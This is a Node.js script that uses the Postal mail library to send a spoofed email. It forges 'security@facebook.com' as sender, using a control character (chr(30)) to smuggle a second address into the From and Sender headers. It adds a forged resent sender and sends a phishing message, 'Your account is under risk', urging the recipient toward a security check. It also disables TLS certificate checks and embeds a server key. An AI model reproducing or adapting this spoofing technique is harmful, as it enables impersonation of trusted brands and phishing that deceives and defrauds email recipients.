const express = require('express')
const port = 3000
const bodyParser = require('body-parser');

const app = express()
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
var Postal = require('@atech/postal');

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";


// Create a new Postal client using a server key generated using your
// installation's web interface
var client = new Postal.Client('localhost', '6ghj2hBoazbHsH7LvArOqBTE');

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
// Create a new message
//var yaml = require('js-yaml')
function chr (codePt) {
  //  discuss at: https://locutus.io/php/chr/
  // original by: Kevin van Zonneveld (https://kvz.io)
  // improved by: Brett Zamir (https://brett-zamir.me)
  //   example 1: chr(75) === 'K'
  //   example 1: chr(65536) === '\uD800\uDC00'
  //   returns 1: true
  //   returns 1: true
  if (codePt > 0xFFFF) { // Create a four-byte string (length 2) since this code point is high
    //   enough for the UTF-16 encoding (JavaScript internal use), to
    //   require representation with two surrogates (reserved non-characters
    //   used for building other characters; the first is "high" and the next "low")
    codePt -= 0x10000
    return String.fromCharCode(0xD800 + (codePt >> 10), 0xDC00 + (codePt & 0x3FF))
  }
  return String.fromCharCode(codePt)
}

const fs = require('fs');
const { exec } = require("child_process");


//for(i=0;i<45;i=i+3){
	//return
	var message = new Postal.SendMessage(client);
        message.to("howthingsworkv2@gmail.com")
	message.from("security@facebook.com"+chr(30)+",<info@pujanpaudel.net>")
	message.subject("Your account is under risk")
	message.plainBody("Get through security check from our website , quick!!")
	message.sender("security@facebook.com"+chr(30)+",<info@pujanpaudel.net>")
	message.dkim_domain("pujanpaudel.net")
	message.dkim_subdomain("postal-IZOG0a")
	message.smtp_mailfrom("info@pujanpaudel.net")
	message.resent_sender("publications@mdpi.com")
	message.custom_headers({"from":"info@pujanpaudel.net"})	
	message.send()
  .then(function (result) {
    var recipients = result.recipients();
    // Loop through each of the recipients to get the message ID
    for (var email in recipients) {
      var message = recipients[email];
      console.log(message.id());    // Logs the message ID
      console.log(message.token()); // Logs the message's token
    }
  }).catch(function (error) {
    // Do something with the error
          console.log("Erred")
    console.log(error.code);
    console.log(error.message);
  });

//}
